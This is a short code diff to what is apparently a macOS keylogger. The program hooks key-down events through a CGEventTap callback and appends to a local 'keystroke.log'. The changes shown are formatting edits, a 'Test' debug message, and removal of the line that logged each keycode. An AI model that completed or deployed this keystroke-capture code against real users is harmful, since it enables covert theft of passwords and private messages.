@@ -7,7 +7,7 @@
 using namespace std;
 
 FILE *logfile = NULL;
-CGEventRef CGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);
+CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
 const char *convertKeyCode(int);
 
 int main(int argc, const char *argv[]) {
@@ -27,22 +27,20 @@ int main(int argc, const char *argv[]) {
 
     const char *logfileLocation = "./keystroke.log";
     logfile = fopen(logfileLocation, "a");
-    fprintf(logfile, "Keylogging has begun.\n\n");
+    fprintf(logfile, "Test");
+    cout << logfileLocation << endl;
+    fflush(logfile);
     CFRunLoopRun();
 
     return 0;
 }
 
-CGEventRef CGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
     if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) { 
         return event;
     }
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
     return event;
 }
 
-const char *convertKeyCode(int keyCode) {
-    return "keypress";
-}
